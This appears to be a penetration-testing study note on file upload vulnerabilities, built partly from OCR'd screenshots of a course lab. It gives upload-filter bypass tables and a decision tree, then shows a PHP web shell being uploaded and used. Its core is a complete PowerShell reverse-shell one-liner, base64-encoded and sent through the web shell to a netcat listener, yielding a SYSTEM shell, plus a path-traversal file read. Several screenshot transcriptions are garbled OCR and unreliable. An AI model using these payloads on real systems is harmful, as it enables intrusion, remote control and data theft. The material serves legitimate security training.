---
tags:
  - rce
  - shell
---

# Using executable files

> [!tip] Quick Reference — File Upload
> | Bypass | Technique |
> |--------|-----------|
> | Extension filter | `.php5`, `.phtml`, `.phar`, `.php.jpg` |
> | MIME type | Change Content-Type to `image/jpeg` in Burp |
> | Magic bytes | Prepend `GIF89a` or `ÿØÿ` to PHP file |
> | Double extension | `shell.php.jpg` (if server executes first ext) |
> | Case variation | `shell.PhP`, `shell.PHP` |
> | Null byte | `shell.php%00.jpg` (old PHP) |

## Decision Tree

```
File upload functionality found?
├── [1] What extensions are allowed?
│   ├── Try uploading shell.php directly
│   │   ├── Accepted → upload and navigate to file
│   │   └── Blocked → try bypass techniques
│   │
├── [2] Extension bypasses
│   ├── Alternate PHP: .php5 .phtml .phar .php3
│   ├── Double ext: shell.php.jpg
│   └── Case: shell.PhP
│
├── [3] Content-Type bypass (Burp)
│   └── Upload .php file, intercept in Burp
│       └── Change Content-Type: application/x-php → image/jpeg
│
├── [4] Magic bytes bypass
│   └── Add GIF89a; to start of PHP file, save as shell.php.gif
│
├── [5] Find where files are uploaded
│   ├── Check page source for upload path
│   ├── Gobuster the uploads directory
│   └── Common paths: /uploads/ /files/ /media/ /images/
│
└── File accessible + executable → GET /uploads/shell.php?cmd=id
```

## Resources
- [HackTricks — File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [PayloadsAllTheThings — Upload Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)


Depending on the web application and its usage, we can make educated guesses to locate upload mechanisms. If the web application is a Content Management System (CMS), we can often upload an avatar for our profile or create blog posts and web pages with attached files. If our target is a company website, we can often find upload mechanisms in career sections or company-specific use cases. For example, if the target website belongs to a lawyer's office, there may be an upload mechanism for case files. Sometimes the file upload mechanisms are not obvious to users, so we should never skip the enumeration phase when working with a web application.

> [!note]- Screenshot
> ```
> ie
> «sca © & wareasors 2 iw
> Kal @ abode = Hab Dacs MNaLFours KN Epll.0O © Gog Hang 08_* Oc
> ee
> la
> Attention: Our old web site got hacked... ke, ea OF
> ay x uC
> 
> cis Bee ~~
> 
> SS eee 7 ih
> 
> rom LEHR. Yaa te
> 
> Setar iin” emcee eels ee gq ate
> 
> —
> al
> Figure 14: Updated "Mountain Desserts" Web Application
> Figure 14 shows that in the new version of the "Mountain Desserts" app, the Admin link
> has been replaced by an upload form. The text explains that we can upload a picture to
> win a contest. The tab bar also shows an XAMPP icon displayed in the current tab,
> indicating the web application is likely running the XAMPP stack. The text explains that
> the company wanted to switch to Windows, so we can assume that the web application
> is now running on a Windows system. Let's find out if we can upload a text file instead
> of an image.
> kali@kali:~$ echo “this is a test” > test.txt
> Listing 30 - Create a test text file
> ```

echo "this is a test" > test.txt

> [!note]- Screenshot
> ```
> Let's upload the test file to the web application via the upload form in the browser.
>  192.168.50.189/meteor/u x +
> €«€ > Ca O @& 192.168.50.189/mete pload.php
> Kali Linux 8 KaliTools # KaliDocs XQ KaliForums @ KaliNetHunter ® Explo
> Upload worked!
> File test.txt has been uploaded in the uploads directory!
> Figure 15: Successful Upload of test.txt
> Figure 15 shows that we successfully uploaded our text file, so we know that the upload
> mechanism is not limited to images only. Next, let's attempt to upload the simple-
> backdoor.php webshell used in the previous Learning Unit.
>  192.168.50.189/meteor/u x = +
> «> Co O & 192.168.50.189/meteor/upload.pt
> Kali Linux #8 Kali Tools  KaliDocs §{KaliForums «® Kali NetHunter ® Explo
> PHP files are not allowed! All PHP extensions are blacklisted.
> Figure 16: Failed Upload of simple-backdoor.php
> Figure 16 shows that the web application blocked our upload, stating that PHP files are
> not allowed and files with PHP file extensions are blacklisted. Since we don't know
> exactly how the filter is implemented, we'll use a trial-and-error approach to find ways
> to bypass it.
> ```

One method to bypass this filter is to change the file extension to a less-commonly used PHP file extension such as .phps or .php7. This may allow us to bypass simple filters that only check for the most common file extensions, .php and .phtml. These alternative file extensions were mostly used for older versions of PHP or specific use cases but are still supported for compatibility in modern PHP versions.

> [!note]- Screenshot
> ```
> Another way we can bypass the filter is by changing characters in the file extension to
> upper case. The blacklist may be implemented by comparing the file extension of the
> uploaded file to a list of strings containing only lower-case PHP file extensions. If so, we
> can update the uploaded file extension with upper-case characters to bypass the filter.
> Let's try the second method, updating our simple-backdoor.php file extension from
> -php to .pHP. After renaming the file either in the terminal or file explorer, we'll upload it
> via the web form.
>  192.168.50.189/meteor/u x +
> <> Ca © @ 192.168.50.189/meteor/upload.pt
> Kali Linux #8 Kali Tools = KaliDocs ¥ KaliForums «® Kali NetHunter ® Exploit-DB ®&
> Upload worked!
> File simple-backdoor.pHP has been uploaded in the uploads directory!
> Figure 17: Successful Upload of simple-backdoor pHP
> 
> This small change allowed us to bypass the filter and upload the file. Let's confirm if we
> can use it to execute code as we did in the RFI section. The output shows that our file
> was uploaded to the "uploads" directory, so we can assume there is a directory named
> "uploads".
> ```


> [!note]- Screenshot
> ```
> Let's use curl to provide dir as a command for the "cmd" parameter of our uploaded
> web shell.
> kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor . pHP?cmd=dir
> Directory of C:\xampp\htdocs\meteor\uploads
> 04/04/2022 06:23 AM <DIR> :
> 04/04/2022 06:23 AM <DIR> -
> 04/04/2022 06:21 AM 328 simple-backdoor. pHP
> 04/04/2022 06:03 AM 45 test. txt
> 2 File(s) 343 bytes
> 2 Dir(s) 15,410,925,568 bytes free
> Listing 31 - Execution of dir command in the uploaded webshell
> Listing 31 shows us the output of the dir command, confirming we can now execute
> commands on the target system. Although this bypass was quick and basic, these kinds
> of bypasses are often highly effective.
> ```

curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir

> [!note]- Screenshot
> ```
> Listing 31 shows us the output of the dir command, confirming we can now execute
> commands on the target system. Although this bypass was quick and basic, these kinds
> of bypasses are often highly effective.
> Let's wrap up this section by obtaining a reverse shell from the target machine. We'll
> start a Netcat listener in a new terminal to catch the incoming reverse shell on port
> 4444.
> 
> kali@kali:~$ nc -nvlp 4444
> 
> listening on [any] 4444 ...
> 
> Listing 32 - Starting Netcat listener on port 4444
> 
> Let's use a PowerShell one-liner for our reverse shell. Since there are several special
> characters in the reverse shell one-liner, we will encode the string with base64. We can
> use PowerShell or an online converter (https://www.base64encode.org/) to perform the
> encoding.
> ```

powershell one-liner: $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

> [!note]- Screenshot
> ```
> In this demonstration, we'll use PowerShell on our Kali machine to encode the reverse
> shell one-liner. First, let's create the variable $7ext, which will be used for storing the
> reverse shell one-liner as a string. Then, we can use the method convert and the
> property Unicode from the class Encoding to encode the contents of the $7ext variable.
> 
> kali@kali:~§ pwsh
> 
> PowerShell 7.1.3
> 
> Copyright (c) Microsoft Corporation.
> 
> https: //aka.ms/powershell
> 
> Type ‘help’ to get help.
> 
> PS> $Text = “$client = New-Object System.Net.Sockets. TCPClient("192.168.119.3" ,4444) $5
> 
> tream = $client .Getstream();[byte[]]$bytes = @..65535|%{0};while(($i = $stream.Read($by
> 
> tes, 0, $bytes.Length)) -ne @){;$data = (New-Object -TypeName System. Text .ASCIIEncodin
> 
> g).GetString(Sbytes.0, $i)i$sendback = (iex $data 2>81 | Out-String )i$sendback2 = $sen
> 
> dback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding] : :ASCII).GetBytes($sendba
> 
> ck2) ;$stream.Write($sendbyte,0,$sendbyte.Length) ;$stream.Flush()};$client .Close()*
> 
> Ps> $Bytes = [System. Text. Encoding] : :Unicode.GetBytes ($Text)
> 
> PS> $EncodedText =[Convert]: :ToBase64String($Bytes)
> 
> PS> $EncodedText
> 
> JAB AGwAaQB1AG4AdAAAD@ATABOAGUAdWAtAESAY gBqAGUAY wB@ACAAUWBSAHMAGAB1AG@AL gBOAGUAGAAUAFM,
> 
> ‘AbwBJAGSAZQBO
> 
> ‘AY gBSAHQAZQAUAEWAZOBUAGCAGABOACKAQwAKAHMAGAByAGUAYQBtAC4ARgBSAHUACHBOACEAKQBSADSAJAB JAG
> 
> whaQB1AG4AdAAUAEMADABVAHMAZQAOACKA
> 
> PS> exit
> 
> Listing 33 - Encoding the oneliner in PowerShell on Linux
> ```

pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.205",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
exit

> [!note]- Screenshot
> ```
> As shown in Listing 33, the $EncodedText variable contains the encoded reverse shell
> one-liner. Let's use curl to execute the encoded one-liner via the uploaded simple-
> backdoor.pHP. We can add the base64 encoded string for the powershell command
> using the -enc parameter. We'll also need to use URL encoding for the spaces.
> kali@kali:~§ curl http://192.168.50.189/meteor/uploads/simple-backdoor . pHP?cmd=powershe
> 11%20-enc%20IABjAGwAaQB1AG4AdAAGADOATABOAGUAdWATAESAY gBqAGUAYWBOACAAUNBSAHMAGABLAGOAL GB
> OAGUAGAAUAFMAbwBjAGSAZQBO
> ‘AY gB5AHQAZQAUAEWAZQBUAGCAABOACKAwAKAHMAGAByAGUAYQBtAC4ARgBSAHUACWBOACEAKQBOADSAIJABJAG
> whaQB1AG4AdAAUAEMADABVAHMAZQAOACKA
> Listing 34 - Using curl to send the base64 encoded reverse shell oneliner
> ```

curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

> [!note]- Screenshot
> ```
> After executing the command, we should receive an incoming reverse shell in the
> second terminal where Netcat is listening.
> 4 ;
> kali@kali:~$ nc -nvlp 4444
> listening on [any] 4444 ...
> connect to [192.168.119.3] from (UNKNOWN) [192.168.590.189] 50603
> ipconfig
> Windows IP Configuration
> Ethernet adapter Ethernet@ 2:
> Connection-specific DNS Suffix . :
> Ipva Address... . .. . . . . : 192.168.50.189
> Subnet Mask... 2... . : 255.255.255.0
> Default Gateway... .. . . . . : 192.168.50.254
> PS C:\xampp\htdocs\meteor\uploads> whoami
> nt authority\system
> Listing 35 - Incoming reverse shell
> Listing 35 shows that we received a reverse shell through the base64 encoded reverse
> shell one-liner. Great!
> ```

nc -nvlp 4444
ipconfig
whoami

Listing 35 shows that we received a reverse shell through the base64 encoded reverse shell one-liner. Great!

> [!note]- Screenshot
> ```
> In this section, we have demonstrated how to abuse a file upload mechanism in a PHP
> web application. We achieved code execution by uploading a web shell from our Kali
> system. If the target web application was using ASP instead of PHP, we could have used
> the same process to obtain code execution as we did in the previous example, instead
> uploading an ASP web shell. Fortunately for us, Kali already contains a broad variety of
> web shells covering the frameworks and languages we discussed previously located in
> the /usr/share/webshells/ directory.
> 
> kali@kali:~$ 1s -la /usr/share/webshells
> 
> total 40
> 
> druxr-xr-x 8 root root 4896 Feb 11 02:00 .
> 
> druxr-xr-x 32@ root root 12288 Apr 19 09:17 ..
> 
> druxr-xr-x 2 root root 4096 Feb 11 01:58 asp
> 
> druxr-xr-x 2 root root 4896 Apr 25 07:25 aspx
> 
> druxr-xr-x 2 root root 4096 Feb 11 01:58 cfm
> 
> druxr-xr-x 2 root root 4096 Apr 25 07:06 jsp
> 
> Irwxrwxrwx 1 root root 19 Feb 11 @2:0@ laudanum -> /usr/share/laudanum
> 
> druxr-xr-x 2 root root 4096 Feb 11 01:58 perl
> 
> druxr-xr-x 3 root root 4096 Feb 11 01:58 php
> 
> Listing 36 - Listing of the webshells directory on Kali
> ```

ls -la /usr/share/webshells

Listing 36 shows us the frameworks and languages for which Kali already offers web shells. It is important to understand that while the implementation of a web shell is dependent on the programming language, the basic process of using a web shell is nearly identical across these frameworks and languages. After we identify the framework or language of the target web application, we need to find a way to upload our web shell. The web shell needs to be placed in a location where we can access it. Next, we can provide commands to it, which are executed on the underlying system.

We should be aware that the file types of our web shells may be blacklisted via a filter or upload mechanism. In situations like this, we can try to bypass the filter as in this section. However, there are other options to consider. Web applications handling and managing files often enable users to rename or modify files. We could abuse this by uploading a file with an innocent file type like .txt, then changing the file back to the original file type of the web shell by renaming it.

http://192.168.152.16/simple-backdoor.phP?cmd=cat%20../../../../../opt/install.txt